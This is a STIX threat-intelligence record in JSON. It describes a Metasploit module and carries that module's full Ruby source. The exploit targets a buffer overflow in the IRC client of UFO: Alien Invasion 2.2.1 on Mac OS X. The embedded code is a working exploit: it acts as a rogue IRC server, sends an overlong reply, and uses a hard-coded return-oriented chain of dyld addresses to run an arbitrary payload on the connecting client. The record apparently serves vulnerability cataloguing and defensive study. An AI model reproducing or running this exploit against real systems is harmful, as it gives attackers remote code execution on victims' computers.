{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--49e60d6c-cc4a-4790-9449-bc94e3ff9684",
    "created": "2024-08-14T16:34:34.70808Z",
    "modified": "2024-08-14T16:34:34.708085Z",
    "name": "UFO: Alien Invasion IRC Client Buffer Overflow",
    "description": " This module exploits a buffer overflow in the IRC client component of UFO: Alien Invasion 2.2.1. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/osx/misc/ufo_ai.rb",
            "external_id": "ufo_ai.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = AverageRanking\n\n  include Msf::Exploit::Remote::TcpServer\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name' => 'UFO: Alien Invasion IRC Client Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a buffer overflow in the IRC client component\n        of UFO: Alien Invasion 2.2.1.\n      },\n      'Author'   =>\n        [\n          'Jason Geffner',  # Original Windows PoC Author\n          'dookie'          # OSX Exploit Author\n        ],\n      'License'  => MSF_LICENSE,\n      'References' =>\n        [\n          [ 'OSVDB', '65689' ],\n          [ 'EDB', '14013' ]\n        ],\n      'Payload' =>\n        {\n          'Space' => 400,\n          'BadChars' => \"\\x00\\x0a\\x0d\",\n          'MaxNops' => 0,\n          'StackAdjustment' => -3500,\n        },\n      'Platform' => 'osx',\n      'Targets' =>\n        [\n          [ 'Mac OS X 10.5.8 x86, UFOAI 2.2.1',\n            {\n              'Arch' => ARCH_X86,\n              'Offset' => 524,\n              'Writable' => 0x8fe66448,  # dyld __IMPORT\n              # The rest of these addresses are in dyld __TEXT\n              'setjmp' => 0x8fe1cf38,\n              'strdup' => 0x8fe210dc,\n              'jmp_eax' => 0x8fe01041\n            }\n          ]\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2009-10-28'))\n\n    register_options(\n      [\n        OptPort.new('SRVPORT', [ true, \"The IRC daemon port to listen on\", 6667 ]),\n      ])\n  end\n\n\n  def make_exec_payload_from_heap_stub()\n    frag0 =\n      \"\\x90\" + # nop\n      \"\\x58\" + # pop eax\n      \"\\x61\" + # popa\n      \"\\xc3\"   # ret\n\n    frag1 =\n      \"\\x90\" +             # nop\n      \"\\x58\" +             # pop eax\n      \"\\x89\\xe0\" +         # mov eax, esp\n      \"\\x83\\xc0\\x0c\" +     # add eax, byte +0xc\n      \"\\x89\\x44\\x24\\x08\" + # mov [esp+0x8], eax\n      \"\\xc3\"               # ret\n\n    setjmp = target['setjmp']\n    writable = target['Writable']\n    strdup = target['strdup']\n    jmp_eax = target['jmp_eax']\n\n    exec_payload_from_heap_stub =\n      frag0 +\n      [setjmp].pack('V') +\n      [writable + 32, writable].pack(\"V2\") +\n      frag1 +\n      \"X\" * 20 +\n      [setjmp].pack('V') +\n      [writable + 24, writable, strdup, jmp_eax].pack(\"V4\") +\n      \"X\" * 4\n  end\n\n\n  def on_client_connect(client)\n\n    print_status(\"Got client connection...\")\n\n    offset = target['Offset']\n\n    buffer = \"001 :\"\n    buffer << rand_text_alpha_upper(offset)\n    buffer << make_exec_payload_from_heap_stub()\n    buffer << make_nops(16)\n    buffer << payload.encoded\n    buffer << \"\\x0d\\x0a\"\n\n    print_status(\"Sending exploit to #{client.peerhost}:#{client.peerport}...\")\n    client.put(buffer)\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2009-10-28",
    "x_mitre_platforms": [
        "osx'"
    ]
}